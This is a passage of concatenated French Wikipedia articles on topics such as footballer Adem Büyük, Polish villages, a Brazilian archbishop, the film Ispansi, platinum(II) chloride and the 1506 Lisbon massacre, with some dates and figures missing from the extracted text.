Barré par Radamel Falcao et Florin Andone, Büyük ne joue pas beaucoup de matchs. Toutefois, il inscrit son premier but pour le club face à Kayserispor le , permettant à Galatasaray de s'imposer en déplacement sur le score de 3-2 dans les dernières seconde du temps additionnel. Profitant par la suite des blessures de ses coéquipiers, le joueur prend part à plus de rencontre. C'est ainsi que le , il dispute son premier match en ligue des champions face au Real Madrid, Mais son équipe s'inclinera lourdement sur le score de 6-0. Le suivant, il inscrit son premier but dans cette même compétition lors du match nul 1-1 face au Club de Bruges.
En équipe nationale.
Il joue son premier match en équipe nationale le en amical contre l'Irlande du Nord. La Turquie remporte la partie sur le score de 1-0.
Adem Büyük compte un total de quatre sélections pour aucun but inscrit.

</doc>
<doc id="8732841" url="https://fr.wikipedia.org/wiki?curid=8732841" title="Koszajec (Pruszków)">
Koszajec (Pruszków)

Koszajec (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 4 kilomètres au nord-est de Brwinów (siège de la "gmina"), 4 kilomètres à l'ouest de Pruszków (siège du "powiat") et à à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732846" url="https://fr.wikipedia.org/wiki?curid=8732846" title="José Martins da Silva">
José Martins da Silva

José Martins da Silva, né le à Tiros (Minas Gerais, Brésil) et mort le à São Gotardo (Minas Gerais, Brésil), est un prélat catholique brésilien, prélat de Vila Rondônia de 1978 à 1982, puis archevêque de Porto Velho de 1982 à 1997 et, enfin, administrateur du diocèse de Luz de 2002 à 2003.
Biographie.
Formation.
Fils de John Martins da Silva et de Raimunda Maria de Jésus, José est l'aîné d'une famille de 12 enfants. Le , il rejoint le séminaire apostolique de Manhumirim, où il suit des études classiques (primaire et secondaire) puis trois années de philosophie et, enfin, quatre années de théologie au grand séminaire Saint-Joseph de Mariana. Parallèlement, il obtient un diplôme en littérature à la Faculté de Sainte-Marceline de Muriaé.
Prêtrise.
Le , il est ordonné prêtre pour la Congrégation des Missionnaires sacramentaires de Notre-Dame, par Belchior Joaquim da Silva Neto. 
Il exerce d'abord son ministère sacerdotal comme curé dans les paroisses de Manhumirim, Presidente Soares, Espera Feliz et Manhuaçu. Il travaille également comme formateur pour le Grand Séminaire Julio-Maria, à Belo Horizonte, de 1966 à 1969 puis comme aumônier militaire du Bataillon PMMG à Manhuaçu de 1973 à 1978. 
Parallèlement, il exerce la charge d'avocat général de sa congrégation. 
Épiscopat.
Le , il est nommé prélat de Vila Rondônia (futur diocèse de Ji-Paraná) par le pape . Il est consacré le suivant par Belchior Joaquim da Silva Neto, assisté de Antônio Afonso de Miranda et José Eugênio Corrêa. Il choisit alors la devise « "Virtute Dei" » (« Par la puissance de Dieu ! »), issue de l'Épître aux Romains.
Le , il est fait archevêque de Porto Velho par le pape . 
Représentant de la Conférence nationale des évêques du Brésil, il est élu membre du Conseil épiscopal latino-américain, siège qu'il occupe de 1983 à 1991. 
Le , il démissionne de ses fonctions en raison de problèmes de santé et devient ainsi archevêque émérite de Porto Velho.
Cependant, il continue de servir comme curé à Santa Rosa da Serra et comme vicaire à Altos. Le , il est élu administrateur diocésain du diocèse de Luz, fonction qu'il exerce jusqu'au , date de la nomination comme évêque de Don Antonio Carlos Felix.
Il meurt dans la matinée du et est enterré la nuit même, au cimetière local de Shots.

</doc>
<doc id="8732855" url="https://fr.wikipedia.org/wiki?curid=8732855" title="Kotowice (Mazovie)">
Kotowice (Mazovie)

Kotowice (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Il se situe à environ 5 kilomètres à l'ouest de Brwinów (siège de la "gmina"), à l'ouest de Pruszków (siège du "powiat") et à à l'ouest de Varsovie (capitale de la Pologne).
Le village compte approximativement une population de en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732862" url="https://fr.wikipedia.org/wiki?curid=8732862" title="Ubaldo Visconti de Gallura">
Ubaldo Visconti de Gallura

 Ubaldo Visconti de Gallura dit également parfois Ubaldo II, pour le distinguer de son oncle et homonyme, Ubaldo Visconti (né en 1207 – mort en 1238), fut Juge de Gallura à partir de 1225 jusqu'à sa mort, et, également juge consort de Torres de 1236 à 1238.
Biographie.
Ubaldo est le fils de Lamberto Visconti di Eldizio et d'Elena de Lacon-Gunale, fille de Barisone II de Gallura, Juge de Gallura, depuis 1203.
À la suite d'un accord signé novembre 1218 entre son père Lamberto et Mariano II de Torres, Ubaldo devait
épouser une Adelasia de Torres une fille du Juge de Logudoro ou de Torres. Le mariage est célébré en 1219 dans la basilique de Saccargia, à côté de Sassari alors que les deux époux ne sont âgés que de 12 ans ; immédiatement le pape Honorius III, adversaire des Pisans, dépêche son chapelain Bartolomeo 
pour prononcer l'annulation de leur union ; la mission de l'homme d'église échoue et cette alliance entre la 
république de Pise et le Judicat de Logudoro-Torres est maintenue.
En 1225 Ubaldo II hérite du droit de sa mère Elena, dernière descendante des Lacon-Gunale, le Judicat de Gallura où il succède à son père Lamberto. En 1230, quand son oncle Ubaldo Visconti meurt, il occupe aussi également le judicat de Cagliari, et assure ainsi dans la région la continuité de l'influence de sa famille et de la république de Pise en exerçant aussi la régence pour le compte de Benedetta de Cagliari. Le beau-père d'Ubaldo, Mariano II de Torres, disparait en 1232 et son jeune fils Barisone III de Torres, lui succède avant de mourir assassiné en 1236, laissant comme seules héritières l'épouse d'Ubaldo, Adelasia et sa sœur Benedetta. 
Du fait de l'influence d'Ubaldo II, l'assemblée dite « Corona de Logu » de Torres, réunie à Ardara, choisit d'élire à l'unanimité Adelasia comme Juge et « détentrice du titre », qu'elle partage néanmoins avec lui. En 1237 pape Grégoire IX envoie son légat pontifical Alessandro de Torres requérir la reconnaissance formelle de la vassalité de Juge Adelasia au Saint-Siège, ce qui est immédiatement accepté, mais son époux Ubaldo II se refuse à faire de même pour Gallura, reconnaissant seulement l'antique prééminence de l'archidiocèse de Pise. Ubaldo II, sans héritier et dernier rejeton de la dynastie Lacon, rédige un testament en janvier 1237, par lequel il désigne son cousin Giovanni Visconti, fils d'Ubaldo , pour lui succéder dans son Judicat. Mais son épouse Adelasia, après sa mort prématurée à l'âge de 31 ans du fait d'une forte fièvre en 1238, se remarie immédiatement avec Enzio fils illégitime de
l'empereur Frédéric II et s'empare du gouvernement de Gallura, pendant que les deux nouveaux époux reçoivent de l'empereur le titre éphémère de « roi et reine de Sardaigne ». 
La succession au Judicat de Gallura d'Adelasia et d'Enzio fut pourtant nominale car Giovanni Visconti, futur père de Ugolino Visconti, s'en empare effectivement à la mort de son cousin. Enzio continuera indûment à user du titre de roi et de Juge de Gallura et de Torres jusqu'à sa mort en 1272, bien qu'il soit captif à Bologne depuis 1249 et que son union avec Adelasia, qu'il avait abandonné peu après leur mariage, a été annulée.
Ubaldo Visconti résidait essentiellement dans le palais du Judicat à Civita l'actuelle Olbia, mais aussi dans ses résidences d'été des Palais de Baldu et de Balaiana, près de Luogosanto, et de Monteacuto. Le Juge est inhumé selon la tradition dans la crypte de la basilique de Notre-Dame de Luogosanto, lieu utilisé particulièrement pour les plus solennelles cérémonies du Judicat où il avait été intronisé et où reposait déjà sa mère.

</doc>
<doc id="8732863" url="https://fr.wikipedia.org/wiki?curid=8732863" title="Kotowice">
Kotowice

En Pologne, Kotowice peut désigner :

</doc>
<doc id="8732870" url="https://fr.wikipedia.org/wiki?curid=8732870" title="Krosna-Wieś">
Krosna-Wieś

Krosna-Wieś (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 277 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732875" url="https://fr.wikipedia.org/wiki?curid=8732875" title="Ispansi">
Ispansi

Ispansi est un film espagnol réalisé par Carlos Iglesias, sorti en 2010.
Synopsis.
Ce film est dédié "A ceux qui ne sont jamais revenus".
Le .
"Avant que le temps n'efface mes souvenirs, j'ai voulu les partager avec tous ceux qui viendront après".
Le vieil homme qui prononce ces paroles n'a pas pris le soin pour s'asseoir, comme de coutume, d'enlever la neige qui recouvre le siège : la fin du film qui n'est pas dévoilée dans ce synopsis, permet d'en comprendre la raison.
Résumé
En , parmi des millions de personnes qui fuient devant les troupes allemandes qui ont envahi l'URSS, on compte environ 3000 enfants espagnols et 500 adultes accompagnateurs. Ils se trouvent là car le gouvernement républicain en avait envoyé 30000 dans différents pays d'Europe et au Mexique pour leur épargner les horreurs de la Guerre d'Espagne. Les enfants pris en charge par l'administration soviétique et protégés jusqu'alors des conflits doivent à nouveau fuir des villes comme Léningrad, Moscou, Kiev et aller vers l'Est, loin du front, dans l'Oural. 
Le film illustre l'odyssée d'un groupe de ces jeunes espagnols et de leurs accompagnateurs.Le pays est immense et l'hiver très rude. Les conditions de transport sont précaires: les trains subissent des retards considérables car les convois de matériel et de troupes sont prioritaires; lorsqu'il n'y a plus de train le trajet se fait en camion, lorsqu'il n'y a plus de camions on se déplace en télègue, lorsqu'il n'y a plus de télègue on progresse à pied dans la neige. La nourriture manque et parfois les enfants chapardent ou volent ce qui n'est pas sans danger, ou les accompagnateurs échangent des vêtements contre de la nourriture pour ne pas mourir de faim. Il faut aussi se protéger du froid et parfois faire du troc pour passer la nuit à l'abri dans les dépendances d'une ferme car les températures sont si basses qu'elles seraient fatales pour des enfants et des adultes sous-alimentés et parfois malades. De plus l'agresseur est sans pitié : des avions mitraillent les convois et des parachutistes allemands lancés derrière les lignes russes font des "cartons" sur les fuyards. Il y a bien un court moment de répit dans un village des Allemands de la Volga qui les laissent s'installer car ils ont reçu l'ordre d'évacuer leur territoire dans les vingt-quatre heures. Néanmoins, malgré toutes ces épreuves la plupart parvient à Oufa.
Mais ce film n'est pas un documentaire et pour nous faire partager les émotions, les réflexions complexes des personnages dans ce contexte historique particulier, Carlos Iglesias a imaginé d'introduire dans le groupe une femme d'origine aristocratique, Beatriz, qui ayant eu hors mariage, un enfant, Javier, a caché son fils dans un orphelinat où grandissent des enfants de parents républicains morts pendant la guerre civile. Sa maman lui rend régulièrement visite et lorsque la famille apprend que Beatriz a eu un bébé hors mariage, son père, Bernardino Rodriguez del Olmo, la chasse du foyer. Quand Javier est envoyé en Russie, sa mère s'étant emparé des papiers d'identité de sa femme de ménage Paula tuée lors du Siège de Madrid, elle rejoint les enfants en partance pour l'URSS. Ainsi, Paula, tel est son nom dorénavant, se retrouve auprès d'Alvaro, un commissaire politique du Parti communiste espagnol qui conduit le groupe vers l'est de la Russie pour échapper à la guerre. Lorsqu'on découvre ses origines on la surveille d'autant plus qu'Alvaro est très attiré par elle ce qui, de plus, suscite des jalousies. Il fait aussi preuve d'indulgence car il n'oublie pas qu'un lieutenant de la Division Bleue (Seconde Guerre mondiale) a pris beaucoup de risques pour lui sauver la vie et sauver la vie de ses camarades près de Léningrad. 
Mais Laura aime les enfants et son dévouement, sa beauté font oublier ses origines au commissaire politique et malgré les oppositions, les contradictions, les différences exprimées, cela se termine par un mariage avec lune de miel dans un pavillon de chasse dans l'Oural.
La guerre terminée Staline autorise les Espagnols à rentrer au pays.
S'il semble facile de revenir, ces immigrants d'URSS, enfants de républicains, sont des suspects et l'objet de tracasseries de la part de l'administration franquiste. Laura retrouve son frère Jorge un membre de la Phalange espagnole qui aime plus les principes que les personnes, sa mère qui ne communique plus. Elle ne retrouve pas son père qui est mort de chagrin. Paula Beatriz essaie de réintégrer son ancien milieu mais ce qu'elle a vécu la rend étrangère à cette haute société chamarrée et frivole malgré son rôle dirigeant.
L'épilogue est à découvrir.
Distribution.
De plus soixante-dix enfants suisses ont participé au tournage.

</doc>
<doc id="8732878" url="https://fr.wikipedia.org/wiki?curid=8732878" title="Crataegus rhipidophylla">
Crataegus rhipidophylla

Crataegus rhipidophylla est une espèce de plantes à fleurs de la famille des "Rosaceae".
Description.
C'est une aubépine qui peut se présenter sous la forme d'un arbuste ou d'un arbre pouvant atteindre de haut.
Ses fruits possèdent un seul noyau (rarement deux), comme "Crataegus monogyna", mais sont plus gros, de forme subglobuleuse, elliptique ou cylindrique. Elle s'en distingue par les lobes de ses feuilles finement dentées, contrairement à celles de "C. monogyna" qui sont irrégulièrement et plus grossièrement dentées.
Répartition et habitat.
C'est une espèce eurasienne que l'on trouve de la Scandinavie et de la région Baltique, à la France, aux Balkans, à l'Anatolie, au Caucase, à la Crimée, et à l'Ukraine.
Elle tolère mieux l'ombre que la plupart des autres espèces d'aubépines.
Taxinomie.
Le spécimen type pour "Crataegus rhipidophylla" est un holotype nommé par Michel Gandoger. L'échantillon a été collecté en 1870 à la Combe, à Liergues, Rhône, France.
Bien qu'il ne s'agisse pas d'une des espèces les plus fréquentes d'aubépines européennes, le spécimen type pour le genre "Crataegus" L. est un spécimen de "C. rhipidophylla" (initialement "Crataegus oxyacantha" L., "nom. rejic.")
Trois variétés sont actuellement reconnues 
"C. rhipidophylla" var. "ronnigeri" se reconnaît à ses sépales érigés ou subérigés couronnant le fruit
L'espèce est à l'origine de plusieurs hybrides ("voir tableau"). "C." × "macrocarpa" Hegetschw. (avec "C. laevigata" (Poir.) DC.) et "C." × "subsphaericea" Gand. (avec "C. monogyna" Jacq.) sont des formes intermédiaires en taille et en morphologie par rapport aux parents. "C." × "subsphaericea" peut être trouvée à l'extérieur de l'aire de répartition des parents. "C." × "browicziana" K. I. Chr. est l'hybride avec "C. microphylla" K.Koch.

</doc>
<doc id="8732880" url="https://fr.wikipedia.org/wiki?curid=8732880" title="Taku Tsumugi">
Taku Tsumugi

 est née le à Yokohama, dans la préfecture de Kanagawa, au Japon. C'est une dessinatrice et auteur japonaise de bande dessinée.

</doc>
<doc id="8732918" url="https://fr.wikipedia.org/wiki?curid=8732918" title="Ben Lawers">
Ben Lawers

Le Ben Lawers est un sommet d'Écosse culminant à d'altitude.

</doc>
<doc id="8732926" url="https://fr.wikipedia.org/wiki?curid=8732926" title="Mamare Tōno">
Mamare Tōno

 est un écrivain japonais. 
Il a commencé sa carrière sur 2chan sous le pseudonyme . Il est l'auteur des séries Log Horizon et Maoyuu Maou Yuusha, deux séries qui ont été par la suite adaptées en animé. Il est également l'auteur du manga Trattoria After School. 
En 2015, l'auteur a été mis en examen pour évasion fiscale. Quelque temps plus tard, l'auteur s'est excusé auprès de ses fans et a déclaré sur son site web officiel qu'il était préparé à se racheter et payer ses taxes.

</doc>
<doc id="8732928" url="https://fr.wikipedia.org/wiki?curid=8732928" title="Mamare Touno">
Mamare Touno



</doc>
<doc id="8732929" url="https://fr.wikipedia.org/wiki?curid=8732929" title="Mamare Tono">
Mamare Tono



</doc>
<doc id="8732955" url="https://fr.wikipedia.org/wiki?curid=8732955" title="Claire Mérouze">
Claire Mérouze

Claire Mérouze, née à Bordeaux en 1986, est la première femme pilote de chasse de Rafale. Elle est lieutenant-colonel depuis 2022.
Biographie.
Fille d'un ancien officier navigateur sur Mirage IV, elle attrape très tôt la passion de l'aviation en accompagnant son père dans les meetings aériens. En septembre 2005, elle réussit le concours d'entrée à l'École de l'air de Salon-de-Provence (Bouches-du-Rhône).
Pilote de chasse.
Après six années de formation, elle est affectée à la Base aérienne 113 Saint-Dizier-Robinson en janvier 2012. Elle commence une formation à l'escadron "Rafale 2/92 « Aquitaine »", avec des simulateurs, puis à l'Escadron 5/2 Côte d'Or, en voltige et en vol aux instruments, avec l'Alpha Jet, surnommé « "Le Gadget" ».
Major de sa promotion à la Base aérienne 120 Cazaux, en Gironde, elle reçoit une nouvelle affectation à l'Escadron de chasse 1/7 Provence, sous les ordres du lieutenant-colonel Damien Rouillé. C'est sous le nom de code de « "Sharon" » qu'elle obtient dans le ciel de Norvège ses dernières qualifications avec le Rafale.
Elle est la en France à être brevetée pilote de chasse et la première à piloter le "Rafale" (les premières femmes pilotes de chasse sont Élisabeth Boselli en 1946 et Caroline Aigle en 1999).
En août 2020, elle devient chef des opérations de l’Escadron de chasse et d'expérimentation 1/30 Côte d'Argent à la Base aérienne 118 Mont-de-Marsan. Elle prend le commandement de l'escadron le .
Le elle reçoit d'Emmanuel Macron la décoration de chevalier de la Légion d'honneur.
Sportive accomplie.
Elle pratiqua le saut à la perche et l'heptathlon et fut classée dans les vingt meilleures françaises. Elle arrêta lors de sa préparation d'entrée à l'École de l'air.
Missions.
En 2022, elle totalise soixante-six missions, représentant de vol.
Une mission au Mali.

</doc>
<doc id="8732956" url="https://fr.wikipedia.org/wiki?curid=8732956" title="Mouv">
Mouv



</doc>
<doc id="8732957" url="https://fr.wikipedia.org/wiki?curid=8732957" title="Le Jury (collection belge de littérature policière)">
Le Jury (collection belge de littérature policière)

Le Jury est une collection de littérature policière belge fondée par Stanislas-André Steeman en 1940 chez l'imprimeur et éditeur bruxellois A(lbert) Beirnaerdt.
Historique.
En raison de la Seconde Guerre mondiale, les liens existants entre les éditions belge et française sont distendus. Steeman décide donc de créer une collection policière belge écrite par des auteurs belges.
Une première série est publiée de 1940 à 1944. Elle est composée de soixante-six fascicules avec une photo en deux couleurs sur la couverture. Les dix derniers fascicules ne sont pas numérotés.
De façon concomitante, de 1942 à 1944, sont publiés vingt-cinq romans numérotés en chiffres romains. La couverture est photographique et en deux couleurs avec en bas à gauche un médaillon avec la photo de Steeman. Les deux séries sont interdites par l'occupant nazi en 1944.
Une seconde série de cinq fascicules paraît en 1946. Se présentant comme un magazine policier international, elle publie également des auteurs anglo-saxons. 

</doc>
<doc id="8732976" url="https://fr.wikipedia.org/wiki?curid=8732976" title="Chlorure de platine(II)">
Chlorure de platine(II)

Le chlorure de platine(II) est un composé chimique moléculaire de formule brute PtCl2. C'est un solide gris-vert à marron sous forme de poudre, et qui est vert olive lorsqu'il est sous sa forme cristalline.
Structure.
La structure de PtCl2 est similaire à celle de PdCl2. Ils existent à la fois sous une forme polymère dite « α », ou sous une forme hexamère dite « β ». La forme hexamère β se convertit en forme à . Les distances Pt-Pt sont de l'ordre de 3,32- dans la , indiquant l'existence de liaisons métal-métal. Sous les deux formes de PtCl2, l'atome de platine possède une coordinence de 4 correspondant à chlorure. L'atome de chlore possède une coordinence de 2, correspondant aux atomes de platine.
Synthèse.
β-PtCl2 est préparé par chauffage de l'acide chloroplatinique à dans l'air.
Il est également possible d'obtenir PtCl par décomposition de PtCl à .

</doc>
<doc id="8732977" url="https://fr.wikipedia.org/wiki?curid=8732977" title="Milęcin">
Milęcin

Milęcin (prononciation : ) est un village polonais de la gmina de Brwinów dans le powiat de Pruszków de la voïvodie de Mazovie dans le centre-est de la Pologne.
Le village compte approximativement une population de 228 habitants en 2012.
Histoire.
De 1975 à 1998, le village appartenait administrativement à la voïvodie de Varsovie.

</doc>
<doc id="8732979" url="https://fr.wikipedia.org/wiki?curid=8732979" title="Tony Abbott (écrivain)">
Tony Abbott (écrivain)

Tony Abbot, né le à Cleveland, est un écrivain américain spécialisé dans la littérature jeunesse. Avec plus de 95 ouvrages à son actif, il s'est fait un nom grâce à sa série à succès "Les Secrets de Droon", qui s'est écoulée à plus de 12 millions d'exemplaires et a été traduite dans plusieurs langues, dont le français. Abbott est également salué pour sa profonde humanité et son dévouement inébranlable à l'art de l'écriture, deux qualités qui ont été le moteur de ses deux décennies de carrière.
Éducation &amp; carrière littéraire.
À l'âge de huit ans, la famille Abbott déménage à Fairfield, Connecticut, où son père obtient un poste de professeur d'histoire américaine à l'université. Tony suit une scolarité variée entre école paroissiale et lycée public, puis s'inscrit à l'Université du Connecticut. Il y étudie d'abord la musique et la psychologie avant de se spécialiser en littérature anglaise. Après l'obtention de son diplôme, il voyage en Europe pour élargir ses horizons culturels.
De retour aux États-Unis, Tony travaille dans différentes librairies et une maison d'édition. Il rencontre sa future épouse Dolores dans une bibliothèque universitaire. Pendant plusieurs années, il écrit de la poésie avant de s'orienter vers la littérature jeunesse, encouragé par un atelier d'écriture qu'il suit avec Patricia Reilly Giff. Cette formation aboutit à la publication de son premier livre, "".
Tony Abbott a reçu plusieurs distinctions, y compris le ' pour ', et l" pour ' en 2009.
Vie privée.
Tony vit actuellement dans le Connecticut avec son épouse Dolores, leurs deux filles et leurs deux chiens. Il continue d'avoir un impact sur le monde littéraire et est un fervent soutien des librairies indépendantes.
Publications.
Il a publié plus d'une centaine de livres, dont notamment :

</doc>
<doc id="8732980" url="https://fr.wikipedia.org/wiki?curid=8732980" title="Strut Records">
Strut Records

Strut Records est un label anglais fondé en 1999 par Quinton Scott. Il est spécialisé dans l'édition de vieilles perles, relevant particulièrement de genres dansant (funk, calypso, italo disco, etc.) ainsi que d'afrobeat (compilations de musique de Lagos des années 1970, etc.). Près de 300 disques ont été sortis. Le label collabore avec Studio !K7, à l'origine des compilations DJ Kicks.

</doc>
<doc id="8732981" url="https://fr.wikipedia.org/wiki?curid=8732981" title="PtCl2">
PtCl2



</doc>
<doc id="8733002" url="https://fr.wikipedia.org/wiki?curid=8733002" title="Traualpsee">
Traualpsee

Le Traualpsee est un petit lac de barrage dans les Alpes d'Allgäu, en amont du Vilsalpsee.
Géographie.
Surplombant le lac au sud, le refuge de Landsberg est au bord du Grünen Lache, un petit lac de montagne. L'Obere Traualpe se trouve au nord. Le lac fait partie du parc naturel du Vilsalpsee.

</doc>
<doc id="8733003" url="https://fr.wikipedia.org/wiki?curid=8733003" title="Massacre de Lisbonne de 1506">
Massacre de Lisbonne de 1506

Le massacre de Lisbonne connu aussi sous les noms de pogrom de Lisbonne (pogrom de Lisboa) ou tuerie de la Pâques 1506 (Matança da Páscoa de 1506) est un massacre qui eut lieu dans les rues de Lisbonne, au Portugal, entre le 19 et le . Durant ces trois jours, des milliers de Juifs, récemment convertis de force au catholicisme, furent traqués, torturés, violés, massacrés et brûlés par la foule catholique. Le bilan de ce massacre est d'environ .
Contexte.
La persécution des Juifs dans la péninsule Ibérique remonte au avec les émeutes sanglantes de 1391 dont celle contre la juiverie de Séville qui font de nombreux morts.
La même année, au Portugal, le roi Jean, obligeait les Juifs à porter sur leurs vêtements une étoile rouge à six branches, pour les distinguer du reste de la population. Auparavant, Pierre de Portugal, appliquant les directives du quatrième concile du Latran, les avait obligés à résider dans les juiveries.
À la fin du , en pleine crise de succession, la population de Lisbonne entre déjà dans la juiverie pour la piller. Il semble que le prétexte du soutien de certains membres de la communauté juive au parti de la reine Éléonore Teles de Menezes, proche de la Castille, ait déclenché cette réaction de colère populaire.
Après avoir été convertis ou expulsés d'Espagne par les Rois catholiques, en 1492 - année cruciale, de nombreux Juifs trouvent refuge au Portugal, moyennant paiement exigé à l'arrivée par les autorités portugaises. Près de Juifs viennent se joindre à la communauté juive déjà présente dans le pays.
Manuel du Portugal qui se montre d'abord tolérant, change de politique dès 1497, sous la pression des rois espagnols : après son mariage avec Isabelle d’Aragon en 1497, le monarque ordonne à son tour l’expulsion des juifs de son pays (« le baptême ou l'exil »). Néanmoins, afin de ne pas priver le Portugal de l'apport des Juifs qui occupaient des positions importantes dans la société (médecins, banquiers, commerçants, etc.), il se ravise et ordonne un vendredi des baptêmes contraints pour le dimanche suivant : à peu près cent vingt mille Juifs sont alors convertis au catholicisme en quelques jours, avec, à présent, interdiction d'émigrer. Ces "conversos" sont dès lors désignés sous le titre de« nouveaux chrétiens » les distinguant des « vieux chrétiens ». Parmi eux, des marranes, ces Juifs convertis de force mais continuant à pratiquer leur religion en secret (crypto-judaïsme).
Le massacre.
Le massacre aurait commencé au à Lisbonne le : ce dimanche de Pâques, alors que les fidèles prient pour la fin de la sécheresse, de la faim et de la peste qui règnent dans le pays, un fidèle jure avoir vu sur l'autel, la face du Christ s'illuminer. Pour l'assistance, il ne peut s'agir que d'un miracle, un message de miséricorde divine.
Un des nouveaux chrétiens qui participent à cette messe tente d'expliquer le phénomène par le simple reflet de la lumière d'une bougie. La foule le fait taire en le tirant par les cheveux à l'extérieur avant de le lyncher et de brûler son corps à Rossio (actuelle place Don Pedro IV) dans le centre de la capitale. Cela marque le début d'un massacre qui va durer trois jours. Les "conversos", déjà considérés avec méfiance par la population, deviennent les boucs émissaires parfaits pour tous les malheurs du pays. La foule est encouragée par les frères dominicains, crucifix à la main, qui promettent l'absolution de tous les péchés durant cent jours à ceux qui tueront des nouveaux chrétiens dits hérétiques. Des marins de passage ancrés dans le Tage, hollandais de Zélande, d'Allemagne et d'autres endroits, se joignent à la population de Lisbonne dans ces violences.
Quand le massacre commence, la Cour se trouve à Abrantes où elle s'était installée pour fuir la peste. Manuel était en route pour Béja, pour rendre visite à sa mère. Il aurait été prévenu du massacre à Avis. Il envoie aussitôt des magistrats tenter de mettre fin au bain de sang. De nombreux représentants de l'autorité, présents à Lisbonne, auraient été mis en cause et, dans certains cas, obligés de fuir.
Durant ces journées, des hommes, des femmes et des enfants sont pourchassés, extraits des églises où certains espéraient trouver refuge, torturés, égorgés, massacrés et jetés dans des bûchers improvisés par la foule composée également de jeunes Portugais et d'esclaves diligents pour les faire crépiter dans le quartier du Rossio, près de la place São Domingos à Lisbonne et au bord de la rivière "do Tejo", qui accusent les « nouveaux chrétiens » de déicide, en tant que Juifs convertis neuf ans auparavant, mais aussi d'être à l'origine de la sécheresse et de la peste qui sévissent.
Le massacre dure trois jours, du 19 au , en pleine Semaine sainte de 1506. Le dimanche voit des violences et des bûchers, où face à ces déchaînements, des responsables de la ville renoncent à intervenir de crainte de subir le même sort ; le lundi des scènes de pillage des maisons, de tortures et des enfants qu'on y trouvait au berceau coupés en morceaux ou écrasés contre les murs, et encore des bûchers où les "cristãos-novos" sont jetés morts ou vifs ; le mardi de la même façon et plus tard dans la journée, tous les anciens juifs étaient soit déjà morts soit cachés.
Le pogrom prendra fin avec la mort de João Rodrigues Mascarenhas, écuyer du roi, tué dans la confusion par une foule exaltée qui le prend pour un marrane avant que n'interviennent les troupes du roi pour restaurer l'ordre. Il y avait déjà eu près de morts.
Conséquence.
Envoyés par Manuel avec des pouvoirs spéciaux, Prior do Crato et Dom Diogo Lopo, baron d'Alvito punirent certains des responsables, confisquant leurs biens ou les condamnant à la pendaison. Les marins étrangers s'étaient déjà réfugiés sur leur navire avec leur butin et échappèrent ainsi à toute sanction. Les Dominicains ayant encouragé la foule au pogrom furent dépouillés de leurs ordres religieux, condamnés à mort et exécutés. Il semble que le fameux couvent de São Domingos ait été fermé durant huit ans. Quant aux représentants de la ville de Lisbonne, ils furent exclus du Conseil de la Couronne (« "Conselho da Coroa" », équivalent actuel du Conseil d'État du Portugal) ; ils y siégeaient pourtant depuis 1385, date à laquelle le roi Jean leur accorda ce privilège en remerciement de leur soutien durant la campagne menée pour s'emparer du trône portugais.
À la suite du massacre, face au climat de suspicion à l'égard des convertis, d'antijudaïsme croissant et à l'établissement officiel de l'Inquisition entré en fonction en 1540, soit plus de trente ans après le pogrom, de nombreuses familles juives prirent la fuite ou furent expulsés du pays. La plupart se réfugièrent aux Pays-Bas mais aussi en France, en Turquie et au Brésil.
Même bannis, les Juifs qui devaient quitter le Portugal ne pouvaient le faire qu'en échange d'une rançon à la Couronne, tout comme ils avaient dû s'acquitter d'une taxe à leur installation. Ces Juifs qui émigraient, abandonnaient leurs propriétés ou les vendaient pour un prix dérisoire, n'emportant que ce qu'ils pouvaient transporter.
Quelque temps plus tard, le décret de Manuel de 1497 est assoupli.
Les « nouveaux chrétiens » et marranes restés au Portugal après le massacre, deviennent bientôt les otages de l'Inquisition portugaise qui perdurera au moins nominalement jusqu'en 1821.
Hommage.
Le souvenir de ce massacre se perpétue aujourd'hui à travers l'existence d'un monument inauguré place São Domingos à Lisbonne, le . Sur cette place, traditionnel lieu de rencontre des populations étrangères de Lisbonne, principalement africaines, on trouve également un mur avec les mots « Lisbonne, ville de la tolérance » inscrits dans 34 langues différentes.
Dans l'historiographie portugaise.
Le massacre de Lisbonne de 1506 est un pan de l'histoire portugaise oubliée, qui ne figure pas dans les livres d'histoire du pays, et fut pour ainsi dire effacé de la mémoire collective ; peu d'historiens portugais le mentionnent. L'horreur et la violence d'alors ont été décrites par des contemporains comme (1460 – 1554), Garcia de Resende (1470-1536), Damião de Góis (1502-1574), (1500-1555?) et plus tard par Alexandre Herculano (1810-1877), Oliveira Martins (1845 — 1894) ou plus récemment par l'historien juif américain Yosef Hayim Yerushalmi (1932-2009).

</doc>
<doc id="8733015" url="https://fr.wikipedia.org/wiki?curid=8733015" title="Bac Meilen-Horgen">
Bac Meilen-Horgen



</doc>
<doc id="8733022" url="https://fr.wikipedia.org/wiki?curid=8733022" title="Volkert Merl">
Volkert Merl

Volkert Merl, né le à Erfurt, est un pilote automobile allemand sur circuits à bord de voitures de sport Tourisme, Grand Tourisme et Sport-prototypes.
Biographie.
Sa carrière en compétition s'étale de 1973 (au circuit de Zolder, sur Opel Ascona en GT) jusqu'au début du mois de (lors des 1 000 kilomètres de Spa en championnat du monde d'endurance, après un dernier podium à Most en Interserie quinze jours auparavant).
Il dispute le "Deutsche Rennsport Meisterschaft" régulièrement de 1976 à 1983, durant huit saisons, et à compter de 1977 il s'aligne sur de longues distances dans le championnat du monde des voitures de sport.
Il participe ainsi notamment à trois reprises aux 24 Heures du Mans, obtenant les quatrième (1983) puis cinquième (1984) places avec le "Joest Racing team", à bord de deux Porsche 956 (Claude Haldi et Bernard Béguin sont au préalable ses coéquipiers en 1980, avec une 935).
Palmarès.
Victoires et podiums notables.
DARM:&lt;br&gt;
DRM:&lt;br&gt;
Endurance:&lt;br&gt;

</doc>
<doc id="8733032" url="https://fr.wikipedia.org/wiki?curid=8733032" title="Philippe Laurent (musicien)">
Philippe Laurent (musicien)

Philippe Laurent est un compositeur et musicien français, né le à Tours dans le Centre.
